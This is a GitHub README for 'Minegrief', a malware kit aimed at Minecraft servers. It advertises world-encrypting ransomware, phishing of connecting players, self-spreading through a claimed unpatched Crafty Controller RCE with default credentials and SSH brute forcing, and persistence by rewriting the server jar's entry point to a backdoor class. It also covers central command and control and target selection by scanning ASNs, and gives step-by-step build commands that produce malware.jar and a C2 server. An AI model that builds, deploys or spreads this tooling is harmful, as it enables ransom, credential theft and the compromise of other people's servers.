<h1 align="center">
<b>Minegrief</b>
</h1>

<h1 align="center">
  <img src="https://github.com/user-attachments/assets/251374d0-b0d6-4808-91d7-9400f692101e" alt="minegrief" width="500px" height=auto>
  <br>
</h1>

<p align="center">
<a href="https://x.com/_chebuya"><img src="https://img.shields.io/twitter/follow/_chebuya.svg?logo=twitter"></a>
<a href="https://img.shields.io/github/stars/chebuya/minegrief"><img src="https://img.shields.io/github/stars/chebuya/minegrief"></a>
<a href="https://img.shields.io/badge/Java-000000?logo=OpenJDK"><img src="https://img.shields.io/badge/Java-000000?logo=OpenJDK"></a>
<a href="https://opensource.org/license/MIT"><img src="https://img.shields.io/badge/license-MIT-blue"></a>
</p>

<p align="center">
  <a href="#features">Features</a> •
  <a href="#notes">Notes</a> •
  <a href="#targeting">Targeting</a>
</p>

# Features
Encrypt Minecraft worlds and demand a Minecoin ransom.
<video src="https://github.com/user-attachments/assets/2db17e66-bf90-494a-bf67-0815976330ec" autoplay muted loop playsinline style="max-width: 100%;"></video>

Phish connecting Minecraft players.

<video src="https://github.com/user-attachments/assets/67b052fb-45ac-42bb-96d5-a57c177bd353" autoplay muted loop playsinline style="max-width: 100%;"></video>

Self-spreading to other Minecraft servers using an extendable, module-based lateral movement system.
  - Crafty Controller Auth'd RCE - undisclosed, unpatched, intentional(?) Auth'd RCE in Crafty Controller, a panel for Minecraft server management (https://craftycontrol.com/). Check for default creds of admin:crafty or brute force.
  - SSH brute forcing - Classic SSH brute forcing, Minegrief will copy itself over SCP and execute itself if a login is successful

Persistence/stealth by "infecting" the Minecraft server jar file via manifest entry point modification (https://docs.oracle.com/javase/tutorial/deployment/jar/manifestindex.html)

Centralized command and control for system-level control of infected servers.
<video src="https://github.com/user-attachments/assets/428ca357-8954-4efa-aafd-4754bc640040" autoplay muted loop playsinline style="max-width: 100%;"></video>


Extendable transport system, allowing for the creation of customized C2 channels.

Works on Java 8 and above.


# Notes
Lateral movement modules require minegriefagent to be built as a jar file, as modules will copy itself over in a jar to spread.

## To build the agent jarfile
Download jsch to the root directory of the repository
```bash
wget https://repo1.maven.org/maven2/com/github/mwiede/jsch/0.2.17/jsch-0.2.17.jar
unzip jsch-0.2.17.jar
```

Run this from the root of the repository
```bash
rm -rf build-manual
mkdir build-manual
find agent -name '*.java' > sources.txt
<JAVA 1.8 DIR>/bin/javac -d build-manual @sources.txt
cp -r com/jcraft build-manual/com
echo 'Manifest-Version: 1.0\nMain-Class: net.minecraft.bundler.Backdoor\nBundler-Format: 1.0' > manifest.txt
<JAVA 1.8 DIR>/bin/jar cvfm malware.jar manifest.txt -C build-manual .
```

Run it
```bash
<JAVA 1.8 DIR>/bin/java -jar malware.jar
```

## To build the server jarfile
Run this from the root of the repository
```bash
rm -rf build-manual
mkdir build-manual
find server -name '*.java' > sources.txt
<JAVA 1.8 DIR>/bin/javac -d build-manual @sources.txt
echo 'Manifest-Version: 1.0\nMain-Class: com.chebuya.minegriefserver.Main\nBundler-Format: 1.0' > manifest.txt
<JAVA 1.8 DIR>/bin/jar cvfm c2-server.jar manifest.txt -C build-manual .
```

Run it
```bash
<JAVA 1.8 DIR>/bin/java -jar c2-server.jar
```


# Targeting
Minecraft servers will always have Java installed so we don't have to worry about installing it ourselves.

Infected servers will receive CIDR blocks to scan from the C2. Certain ASNs have a higher frequency of Minecraft servers (ex: Digital Ocean ASNs).  I have scraped shodan/censys to find these ASNs, the data is [here](top-asn.csv)
